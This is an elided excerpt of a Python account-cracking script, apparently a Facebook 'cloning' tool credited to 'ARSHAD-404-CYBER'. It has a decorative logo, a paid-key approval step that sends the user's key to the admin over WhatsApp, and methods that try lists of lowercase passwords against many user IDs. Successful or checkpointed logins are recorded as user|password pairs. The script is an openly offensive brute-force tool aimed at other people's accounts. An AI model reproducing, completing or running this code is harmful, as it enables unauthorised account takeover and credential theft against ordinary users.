...
def logo():
    ...
    \033[38;5;46m║ ║ \033[30;1m██    ██  ║ \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ ARSHAD𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m██    ██ ║ \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ ARSHAD𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m██    ██ ║ \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ ARSHAD𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m██    ██ ║ \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ ARSHAD𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m██████ ║ \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ ARSHAD𝄟⃝║
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/ARSHAD-404-CYBER/A4SHAD.VAU/blob/main/Approval.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        print("               COPY AND SEND KEY TO ADMIN ARSHAD ")
        ...
        os.system('am start https://wa.me/+01883303197?text=' + tks)
        reg()
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20TRICK-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/01883303197?text=' + tks)
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : TRICK A4SHAD [99] ");time.sleep (0.03)
    print("             [*]. FACEBOOK   : ARSHAD AHMED TOPU");time.sleep (0.03)
    print("             [*]. GITHUB     : ARSHAD-404-CYBER ");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [A4SHAD] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-TRICK] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [TRICK] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
